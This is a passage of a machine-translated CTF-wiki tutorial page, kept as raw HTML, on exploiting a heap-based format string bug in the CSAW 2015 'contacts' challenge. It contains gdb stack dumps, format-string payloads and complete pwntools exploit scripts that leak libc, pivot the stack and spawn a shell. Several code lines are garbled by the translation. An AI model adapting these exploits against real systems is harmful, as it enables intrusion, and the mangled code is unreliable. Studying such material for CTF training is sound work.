<span class="n">Success</span> <span class="p">(</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="n">ret_addr</span><span class="p">:</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span> <span class="o">+</span> <span class="n">Hex</span> <span class="p">(</span><span class="n">ret_addr</span><span class="p">))</span>




<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="n">p64</span> <span class="p">(</span><span class="n">ret_addr</span><span class="p">))</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="c1">#sh.writeline(&quot;%2214d%8$hn&quot;)</span>

<span class="c1">#0x4008aa-0x4008a6</span>

<span class="n">sh</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%2218d</span><span class="s2">%8$hn&quot;</span><span class="p">)</span>



<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<h2 id="formatted-string-vulnerability-on-heap">Formatted string vulnerability on heap<a class="headerlink" href="#formatted-string-vulnerability-on-heap" title="Permanent link">&para;</a></h2>
<h3 id="principle_3">Principle<a class="headerlink" href="#principle_3" title="Permanent link">&para;</a></h3>
<p>The so-called formatted string on the heap means that the formatted string itself is stored on the heap. This mainly increases the difficulty of getting the corresponding offset. In general, the formatted string is likely to be copied. On the stack.</p>
<h3 id="examples_3">Examples<a class="headerlink" href="#examples_3" title="Permanent link">&para;</a></h3>
<p>Here we take [contacts] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts</a>) in CSAW 2015 as an example.</p>
<h4 id="determining-protection_3">Determining protection<a class="headerlink" href="#determining-protection_3" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>➜  <span class="m">2015</span>-CSAW-contacts git:<span class="o">(</span>master<span class="o">)</span> ✗ checksec contacts

    Arch:     i386-32-little

    RELRO:    Partial RELRO

    Stack:    Canary found

    NX:       NX enabled

    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
</code></pre></div>
<p>It can be seen that the program not only turns on NX protection but also turns on Canary.</p>
<h4 id="_4">分析程序<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
<p>A simple look at the program, found that the program, as the name describes, is a contact-related program that can create, modify, delete, and print contact information. And after reading it carefully, you can find a format string vulnerability when printing contact information.</p>
<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">PrintInfo</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">)</span>

<span class="p">{</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">Name: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a1</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">Length %u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a2</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">Phone #: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">Description: &quot;</span><span class="p">);</span>

  <span class="k">return</span> <span class="nf">printf</span><span class="p">(</span><span class="n">format</span><span class="p">);</span>

<span class="p">}</span>
</code></pre></div>
<p>Take a closer look and you can see that this format actually points to the heap.</p>
<h4 id="using-ideas_1">Using ideas<a class="headerlink" href="#using-ideas_1" title="Permanent link">&para;</a></h4>
<p>Our basic purpose is to get the system&#39;s shell and get the flag. In fact, since there is a format string vulnerability, we should be able to control the program flow by hijacking the got table or controlling the return address of the program. But it is not very feasible here. The reasons are as follows</p>
<ul>
<li>The reason why we can&#39;t hijack got to control the program flow is because we found that only the printf function that can be output to our given string is common in the program. We only have to select it to construct /bin/sh to execute it. (&#39;/bin/sh&#39;), but the printf function is also used elsewhere, which will cause the program to crash directly.</li>
<li>Secondly, it is not possible to directly control the program return address to control the program flow because we do not have a directly executable address to store our contents, and use the format string to write directly to the stack system__addr + &#39;bbbb &#39; + addr of &#39;/bin/sh&#39; doesn&#39;t seem to be realistic.</li>
</ul>
<p>So what can we do? We also have the skills to talk about stack overflow before, stack pivoting. And here, what we can control happens to be heap memory, so we can move the stack to the heap. Here we use the leave command for stack migration, so before migration we need to modify the program to save the value of ebp to the value we want. Only then will esp become the value we want when we execute the leave instruction. At the same time, because we are using the format string to modify, so we have to know the address of the ebp store, and the address of the ebp stored in the PrintInfo function changes every time, and we can not know by other means. . However, the ebp value pushed into the stack in the program actually saves the address of the ebp value of the previous function<strong>, so we can modify the value of the saved ebp of the upper layer function, ie the upper upper layer function ( That is, the main function) ebp value</strong>. In this way, when the upper program returns, the operation of migrating the stack to the heap is implemented.</p>
<p>The basic idea is as follows</p>
<ul>
<li>First get the address of the system function</li>
<li>Determine by libc database by leaking the address of a libc function.</li>
<li>Construct a basic contact description as system_addr + &#39;bbbb&#39; + binsh_addr</li>
<li>Modify the ebp saved by the upper function (ie the ebp of the upper layer function) to the address -** of the storage system_addr.</li>
<li>When the main program returns, the following operations will occur</li>
<li>move esp, ebp, point esp to the address of system_addr -4</li>
<li>pop ebp, point esp to system_addr</li>
<li>ret, get the shell by pointing eip to system_addr.</li>
</ul>
<h4 id="get-the-relevant-address-and-offset">Get the relevant address and offset<a class="headerlink" href="#get-the-relevant-address-and-offset" title="Permanent link">&para;</a></h4>
<p>Here we mainly get the system function address, /bin/sh address, the address of the contact description stored on the stack, and the address of the PrintInfo function.</p>
<p>First, we get the system function address and /bin/sh address according to the libc_start_main_ret address stored on the stack (which is the function that will run when the main function returns). We construct the corresponding contact, then choose to output the contact information, and breakpoints at printf, and run until the printf function of the format string vulnerability, as follows</p>
<div class="highlight"><pre><span></span><code> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;

   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR <span class="o">[</span>esp<span class="o">]</span>

      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret    

      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR <span class="o">[</span>esp<span class="o">]</span>

      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret    

───────────────────────────────────────────────────────────────────────────────────────<span class="o">[</span> stack <span class="o">]</span>────

<span class="o">[</span><span class="s1">&#39;0xffffccfc&#39;</span>, <span class="s1">&#39;l8&#39;</span><span class="o">]</span>

<span class="m">8</span>

0xffffccfc│+0x00: 0x08048c27  →   leave      ← <span class="nv">$esp</span>

0xffffcd00│+0x04: 0x0804c420  →  <span class="s2">&quot;1234567&quot;</span>

0xffffcd04│+0x08: 0x0804c410  →  <span class="s2">&quot;11111&quot;</span>

0xffffcd08│+0x0c: 0xf7e5acab  →  &lt;puts+11&gt; add ebx, 0x152355

0xffffcd0c│+0x10: 0x00000000

0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0

0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0

0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000   ← <span class="nv">$ebp</span>

──────────────────────────────────────────────────────────────────────────────────────────<span class="o">[</span> trace <span class="o">]</span>────

<span class="o">[</span><span class="c1">#0] 0xf7e44670 → Name: __printf(format=0x804c420 &quot;1234567\n&quot;)</span>

<span class="o">[</span><span class="c1">#1] 0x8048c27 → leave </span>

<span class="o">[</span><span class="c1">#2] 0x8048c99 → add DWORD PTR [ebp-0xc], 0x1</span>

<span class="o">[</span><span class="c1"># 3] 0x80487a2 → jmp 0x80487b3</span>
<span class="o">[</span><span class="c1">#4] 0xf7e13637 → Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 &lt;_dl_fini&gt;, stack_end=0xffffce0c)</span>

<span class="o">[</span><span class="c1"># 5] 0x80485e1 → holds</span>
────────────────────────────────────────────────────────────────────────────────────────────────────

gef➤  dereference <span class="nv">$esp</span> <span class="m">140</span>

<span class="o">[</span><span class="s1">&#39;$esp&#39;</span>, <span class="s1">&#39;140&#39;</span><span class="o">]</span>

<span class="m">1</span>

0xffffccfc│+0x00: 0x08048c27  →   leave      ← <span class="nv">$esp</span>

gef➤  dereference <span class="nv">$esp</span> l140

<span class="o">[</span><span class="s1">&#39;$esp&#39;</span>, <span class="s1">&#39;l140&#39;</span><span class="o">]</span>

<span class="m">140</span>

0xffffccfc│+0x00: 0x08048c27  →   leave      ← <span class="nv">$esp</span>

0xffffcd00│+0x04: 0x0804c420  →  <span class="s2">&quot;1234567&quot;</span>

0xffffcd04│+0x08: 0x0804c410  →  <span class="s2">&quot;11111&quot;</span>

0xffffcd08│+0x0c: 0xf7e5acab  →  &lt;puts+11&gt; add ebx, 0x152355

0xffffcd0c│+0x10: 0x00000000

0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0

0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0

0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000   ← <span class="nv">$ebp</span>

0xffffcd1c│+0x20: 0x08048c99  →   add DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>, 0x1

0xffffcd20│+0x24: 0x0804b0a8  →  <span class="s2">&quot;11111&quot;</span>

0xffffcd24│+0x28: 0x00002b67 <span class="o">(</span><span class="s2">&quot;g+&quot;</span>?<span class="o">)</span>

0xffffcd28│+0x2c: 0x0804c410  →  <span class="s2">&quot;11111&quot;</span>

0xffffcd2c│+0x30: 0x0804c420  →  <span class="s2">&quot;1234567&quot;</span>

0xffffcd30│+0x34: 0xf7fadd60  →  0xfbad2887

0xffffcd34│+0x38: 0x08048ed6  →  0x25007325 <span class="o">(</span><span class="s2">&quot;%s&quot;</span>?<span class="o">)</span>

0xffffcd38│+0x3c: 0x0804b0a0  →  0x0804c420  →  <span class="s2">&quot;1234567&quot;</span>

0xffffcd3c│+0x40: 0x00000000

0xffffcd40│+0x44: 0xf7fad000  →  0x001b1db0

0xffffcd44│+0x48: 0x00000000

0xffffcd48│+0x4c: 0xffffcd78  →  0x00000000

0xffffcd4c│ + 0x50: 0x080487a2 → jmp 0x80487b3
0xffffcd50│+0x54: 0x0804b0a0  →  0x0804c420  →  <span class="s2">&quot;1234567&quot;</span>

0xffffcd54│+0x58: 0xffffcd68  →  0x00000004

0xffffcd58│+0x5c: 0x00000050 <span class="o">(</span><span class="s2">&quot;P&quot;</span>?<span class="o">)</span>

0xffffcd5c│+0x60: 0x00000000

0xffffcd60│+0x64: 0xf7fad3dc  →  0xf7fae1e0  →  0x00000000

0xffffcd64│+0x68: 0x08048288  →  0x00000082

0xffffcd68│+0x6c: 0x00000004

0xffffcd6c│+0x70: 0x0000000a

0xffffcd70│+0x74: 0xf7fad000  →  0x001b1db0

0xffffcd74│+0x78: 0xf7fad000  →  0x001b1db0

0xffffcd78│+0x7c: 0x00000000

0xffffcd7c│+0x80: 0xf7e13637  →  &lt;__libc_start_main+247&gt; add esp, 0x10

0xffffcd80│+0x84: 0x00000001

0xffffcd84│+0x88: 0xffffce14  →  0xffffd00d  →  <span class="s2">&quot;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]&quot;</span>

0xffffcd88│+0x8c: 0xffffce1c  →  0xffffd058  →  <span class="s2">&quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;</span>
</code></pre></div>
<p>We can get it by simple judgment.</p>
<div class="highlight"><pre><span></span><code>0xffffcd7c│+0x80: 0xf7e13637  →  &lt;__libc_start_main+247&gt; add esp, 0x10
</code></pre></div>
<p>Stored is the return address of __libc_start_main, and uses fmtarg to get the corresponding offset. It can be seen that the offset is 32, then the offset from the format string is 31.</p>
<div class="highlight"><pre><span></span><code>gef➤  fmtarg 0xffffcd7c

The index of format argument : <span class="m">32</span>
</code></pre></div>
<p>This way we can get the corresponding address. In turn, you can get the corresponding libc according to libc-database, and then get the system function address and /bin/sh function address.</p>
<p>Second, we can determine that the address 0xffffcd2c of the formatted string stored on the stack is 11 relative to the format string, which is used to construct our contacts.</p>
<p>Furthermore, we can see that the following address holds the call address of the upper function, and its offset from the format string is 6, so that we can directly modify the value of ebp stored in the upper function.</p>
<div class="highlight"><pre><span></span><code>0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000   ← <span class="nv">$ebp</span>
</code></pre></div>
<h4 id="constructing-a-contact-to-get-the-heap-address">Constructing a contact to get the heap address<a class="headerlink" href="#constructing-a-contact-to-get-the-heap-address" title="Permanent link">&para;</a></h4>
<p>After learning the above information, we can use the following method to get the heap address and the corresponding ebp address.</p>
<div class="highlight"><pre><span></span><code>[system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb]
</code></pre></div>
<p>To get the corresponding corresponding address. The latter bbbb is for the convenience of accepting strings.</p>
<p>Here, because the stack space requested by the function is the same as the free space, the ebp address we get will not change because we call it again.</p>
<p>In some environments, the system address will appear \x00, causing 0 truncation when printf will result in the inability to disclose both addresses, so you can modify the payload as follows:</p>
<div class="highlight"><pre><span></span><code>[%6$p][%11$p][ccc][system_addr][bbbb][binsh_addr][dddd]
</code></pre></div>
<p>If the payload is modified to do this, you need to add a 12 offset to the heap. This ensures that the 0 truncation occurs after the leak.</p>
<h4 id="modify-ebp">Modify ebp<a class="headerlink" href="#modify-ebp" title="Permanent link">&para;</a></h4>
<p>Since we need to execute the move command to assign ebp to esp and also need to execute pop ebp to execute the ret instruction, we need to modify ebp to store the value of system address -4. After pop ebp, the esp happens to point to the address of the save system, and the system function can be executed by executing the ret instruction.</p>
<p>We have already learned the ebp value we want to modify, and we know that the corresponding offset is 6, so we can construct the following payload to modify the corresponding value.</p>
<div class="highlight"><pre><span></span><code>part1 = (heap_addr - 4) / 2

part2 = heap_addr - 4 - part1

payload = &#39;%&#39; + str(part1) + &#39;x%&#39; + str(part2) + &#39;x%6$n&#39;
</code></pre></div>
<h4 id="get-the-shell">Get the shell<a class="headerlink" href="#get-the-shell" title="Permanent link">&para;</a></h4>
<p>At this time, after executing the format string function, exit to the upper function, we enter 5, exit the program will execute the ret instruction, you can get the shell.</p>
<h4 id="using-the-program_2">Using the program<a class="headerlink" href="#using-the-program_2" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">contact</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./contacts&#39;</span><span class="p">)</span>

<span class="c1">##context.log_level = &#39;debug&#39;</span>

<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>

    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">111</span><span class="p">)</span>

<span class="k">else</span><span class="p">:</span>

    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./contacts&#39;</span><span class="p">)</span>





<span class="k">def</span> <span class="nf">createcontact</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">phone</span><span class="p">,</span> <span class="n">descrip_len</span><span class="p">,</span> <span class="n">description</span><span class="p">):</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;&amp;gt;&amp;gt;&amp;gt;&amp;#39;)</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Contact info: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Name: &#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;You have 10 numbers</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">phone</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Length of description: &#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">descrip_len</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;description:</span><span class="se">\n\t\t</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">description</span><span class="p">)</span>





<span class="k">def</span> <span class="nf">printcontact</span><span class="p">():</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;&amp;gt;&amp;gt;&amp;gt;&amp;#39;)</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Contacts:&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>





<span class="c1">## get system addr &amp; binsh_addr</span>

<span class="n">payload</span> <span class="o">=</span> <span class="o">&amp;</span><span class="c1">#39;% 31 $ paaaa&amp;#39;</span>
<span class="n">createcontact</span><span class="p">(</span><span class="s1">&#39;1111&#39;</span><span class="p">,</span> <span class="s1">&#39;1111&#39;</span><span class="p">,</span> <span class="s1">&#39;111&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="nb">print</span> <span class="n">contact</span> <span class="p">()</span>
<span class="n">libc_start_main_ret</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;aaaa&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;get libc_start_main_ret addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_start_main_ret</span><span class="p">))</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;__libc_start_main_ret&#39;</span><span class="p">,</span> <span class="n">libc_start_main_ret</span><span class="p">)</span>

<span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_start_main_ret</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;__libc_start_main_ret&#39;</span><span class="p">)</span>

<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>

<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;get system addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;get binsh addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">))</span>

<span class="c1">##gdb.attach(sh)</span>



<span class="c1">## get heap addr and ebp addr</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>

    <span class="n">system_addr</span><span class="p">,</span>

<span class="o">&amp;</span><span class="c1">#39;yyyah&amp;#39;,</span>
    <span class="n">binsh_addr</span><span class="p">,</span>

    <span class="s1">&#39;%6$p%11$pcccc&#39;</span><span class="p">,</span>

<span class="p">])</span>

<span class="n">createcontact</span><span class="p">(</span><span class="s1">&#39;2222&#39;</span><span class="p">,</span> <span class="s1">&#39;2222&#39;</span><span class="p">,</span> <span class="s1">&#39;222&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="nb">print</span> <span class="n">contact</span> <span class="p">()</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;cccc&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>

<span class="nb">print</span> <span class="n">data</span>

<span class="n">ebp_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">heap_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>



<span class="c1">## modify ebp</span>

<span class="n">part1</span> <span class="o">=</span> <span class="p">(</span><span class="n">heap_addr</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>

<span class="n">part2</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="n">part1</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">part1</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;x%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">part2</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;x%6$n&#39;</span>

<span class="c1">##print payload</span>

<span class="n">createcontact</span><span class="p">(</span><span class="s1">&#39;3333&#39;</span><span class="p">,</span> <span class="s1">&#39;123456789&#39;</span><span class="p">,</span> <span class="s1">&#39;300&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="nb">print</span> <span class="n">contact</span> <span class="p">()</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>

<span class="c1">##gdb.attach(sh)</span>

<span class="nb">print</span> <span class="s1">&#39;get shell&#39;</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;&amp;gt;&amp;gt;&amp;gt;&amp;#39;)</span>
<span class="c1">##get shell</span>

<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<p>In the case of system 0 truncation, exp is as follows:
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;debug&quot;</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s2">&quot;x86&quot;</span>



<span class="n">io</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&quot;./contacts&quot;</span><span class="p">)</span>

<span class="n">binary</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;contacts&quot;</span><span class="p">)</span>

<span class="n">libc</span><span class="o">=</span><span class="n">binary</span><span class="o">.</span><span class="n">libc</span>


<span class="k">def</span> <span class="nf">createcontact</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">phone</span><span class="p">,</span> <span class="n">descrip_len</span><span class="p">,</span> <span class="n">description</span><span class="p">):</span>

<span class="n">I</span> <span class="n">sh</span> <span class="o">=</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;&amp;gt;&amp;gt;&amp;gt;&amp;#39;)</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Contact info: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Name: &#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;You have 10 numbers</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">phone</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Length of description: &#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">descrip_len</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;description:</span><span class="se">\n\t\t</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">description</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">printcontact</span><span class="p">(</span><span class="n">io</span><span class="p">):</span>

<span class="n">I</span> <span class="n">sh</span> <span class="o">=</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;&amp;gt;&amp;gt;&amp;gt;&amp;#39;)</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Contacts:&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>



<span class="c1"># Gdb.attach (I)</span>


<span class="n">createcontact</span> <span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="mi">111</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="o">%</span> <span class="mi">31</span> <span class="err">$</span> <span class="n">paaaa</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
<span class="n">printcontact</span> <span class="p">(</span><span class="n">I</span><span class="p">)</span>
